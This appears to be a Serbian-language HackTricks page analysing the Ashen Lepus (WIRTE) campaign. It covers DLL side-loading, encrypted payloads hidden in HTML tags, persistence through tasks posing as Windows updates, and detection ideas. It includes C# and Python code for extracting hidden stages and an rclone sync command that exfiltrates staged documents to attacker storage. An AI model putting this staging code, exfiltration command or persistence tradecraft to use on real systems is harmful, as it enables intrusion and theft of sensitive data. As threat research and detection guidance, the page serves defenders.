# Napredno DLL Side-Loading sa HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Pregled tradecraft-a

Ashen Lepus (aka WIRTE) je naoružao ponovljiv obrazac koji spaja DLL sideloading, staged HTML payloads i modularne .NET backdoore da bi se održao unutar diplomatskih mreža na Bliskom istoku. Tehnika je ponovo upotrebljiva od strane bilo kog operatera jer se oslanja na:

- **Archive-based social engineering**: neškodljivi PDF-ovi upućuju mete da preuzmu RAR arhivu sa sajta za deljenje fajlova. Arhiva sadrži verodostojan document viewer EXE, zlonamerni DLL nazvan po pouzdanoj biblioteci (npr. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), i mamac `Document.pdf`.
- **DLL search order abuse**: žrtva dvoklikne EXE, Windows rešava DLL import iz trenutnog direktorijuma, i zlonamerni loader (AshenLoader) se izvršava unutar pouzdanog procesa dok se mamac PDF otvara da bi se izbegla sumnja.
- **Living-off-the-land staging**: svaka kasnija faza (AshenStager → AshenOrchestrator → modules) se čuva van diska dok nije potrebna, isporučujući se kao enkriptovani blob-ovi sakriveni unutar inače bezopasnih HTML odgovora.

## Višestepeni lanac Side-Loading-a

1. **Decoy EXE → AshenLoader**: EXE side-load-uje AshenLoader, koji sprovodi host recon, enkriptuje ga AES-CTR-om, i POST-uje ga unutar rotirajućih parametara kao što su `token=`, `id=`, `q=` ili `auth=` ka putanjama koje liče na API (npr. `/api/v2/account`).
2. **HTML extraction**: C2 otkriva sledeću fazu samo kada se IP klijenta geolocira u ciljnu regiju i `User-Agent` odgovara implantatu, frustrirajući sandbox-ove. Kada provere prođu, HTTP telo sadrži `<headerp>...</headerp>` blob sa Base64/AES-CTR enkriptovanim AshenStager payload-om.
3. **Second sideload**: AshenStager se raspoređuje sa drugim legitimnim binarnim fajlom koji importuje `wtsapi32.dll`. Zlonamerni primerak ubačen u binarni fajl preuzima više HTML-a, ovaj put vađenjem `<article>...</article>` da bi prikupio AshenOrchestrator.
4. **AshenOrchestrator**: modularni .NET kontroler koji dekodira Base64 JSON konfiguraciju. Polja `tg` i `au` u konfiguraciji se konkateniraju/haširaju u AES ključ, koji dekriptuje `xrk`. Dobijeni bajtovi služe kao XOR ključ za svaki modul blob koji se potom preuzima.
5. **Module delivery**: svaki modul je opisan kroz HTML komentare koji preusmeravaju parser na proizvoljan tag, kršeći statička pravila koja gledaju samo za `<headerp>` ili `<article>`. Moduli uključuju persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), i file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Čak i ako odbranioci blokiraju ili uklone određeni element, operatoru je dovoljno da promeni tag naznačen u HTML komentaru da bi nastavio isporuku.

### Brzi pomoćnik za ekstrakciju (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelnosti izbegavanja HTML staging-a

Nedavno istraživanje HTML smuggling-a (Talos) ističe payloads sakrivene kao Base64 stringovi unutar `<script>` blokova u HTML prilozima i dekodirane putem JavaScript-a u runtime-u. Isti trik može se ponovo upotrebiti za C2 odgovore: stage-ovati enkriptovane blob-ove unutar `<script>` taga (ili drugog DOM elementa) i dekodirati ih u memoriji pre AES/XOR, što čini stranicu običnim HTML-om.

## Crypto & C2 Ojačavanje

- **AES-CTR everywhere**: trenutni loader-i ugrađuju 256-bit ključeve plus nonces (npr. `{9a 20 51 98 ...}`) i opciono dodaju XOR sloj koristeći stringove kao `msasn1.dll` pre/posle dekripcije.
- **Infrastructure split + subdomain camouflage**: staging serveri su razdvojeni po alatu, hostovani preko različitih ASN-ova i ponekad prekriveni legitimno izgledajućim poddomenima, tako da kompromitovanje jedne faze ne otkriva ostale.
- **Recon smuggling**: prikupljeni podaci sada uključuju Program Files liste da bi se identifikovale aplikacije visoke vrednosti i uvek se enkriptuju pre nego što napuste host.
- **URI churn**: query parametri i REST putanje rotiraju između kampanja (`/api/v1/account?token=` → `/api/v2/account?auth=`), što onemogućava krhke detekcije.
- **Gated delivery**: serveri su geo-fenced i odgovaraju samo stvarnim implantima. Neodobreni klijenti dobijaju bezazleni HTML.

## Persistence & Execution Loop

AshenStager drop-uje scheduled tasks koji se predstavljaju kao Windows maintenance job-ovi i izvršavaju se preko `svchost.exe`, npr.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ovi taskovi ponovo pokreću sideloading lanac pri boot-u ili na intervalima, osiguravajući da AshenOrchestrator može zahtevati sveže module bez ponovnog pisanja na disk.

## Korišćenje benignih sync klijenata za exfiltration

Operatori stage-uju diplomatske dokumente unutar `C:\Users\Public` (world-readable i ne-sumnjivo) kroz dedicated modul, zatim preuzmu legitimni [Rclone](https://rclone.org/) binarni fajl da sinhronizuju taj direktorijum sa attacker storage-om. Unit42 primećuje da je ovo prvi put da je ovaj glumac viđen koristeći Rclone za exfiltration, u skladu sa širim trendom zloupotrebe legitimnih sync alata da bi se uklopili u normalan saobraćaj:

1. **Stage**: copy/collect target fajlove u `C:\Users\Public\{campaign}\`.
2. **Configure**: isporučiti Rclone config koji pokazuje na attacker-controlled HTTPS endpoint (npr. `api.technology-system[.]com`).
3. **Sync**: pokrenuti `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` tako da saobraćaj liči na normalne cloud backup-e.

Pošto se Rclone široko koristi za legitimne backup tokove, odbrambene ekipe treba da se fokusiraju na anomalne exec-ove (novi binari, čudni remoti, ili naglo sinhronizovanje `C:\Users\Public`).

## Detection Pivots

- Alert-ovati na **signed processes** koji neočekivano load-uju DLL-ove iz user-writable putanja (Procmon filteri + `Get-ProcessMitigation -Module`), posebno kada imena DLL-ova preklapaju `netutils`, `srvcli`, `dwampi`, ili `wtsapi32`.
- Inspect-ovati sumnjive HTTPS odgovore za **velike Base64 blob-ove ugrađene unutar neuobičajenih tag-ova** ili zaštićene `<!-- TAG: <xyz> -->` komentarima.
- Proširiti HTML hunting na **Base64 stringove unutar `<script>` blokova** (HTML smuggling-style staging) koji se dekodiraju putem JavaScript-a pre AES/XOR obrade.
- Hunt-ovati za **scheduled tasks** koji pokreću `svchost.exe` sa non-service argumentima ili koji upućuju nazad na dropper direktorijume.
- Monitor-ovati pojavljivanje **Rclone** binarija van IT-managed lokacija, nove `rclone.conf` fajlove, ili sync job-ove koji vuku podatke iz staging direktorijuma poput `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
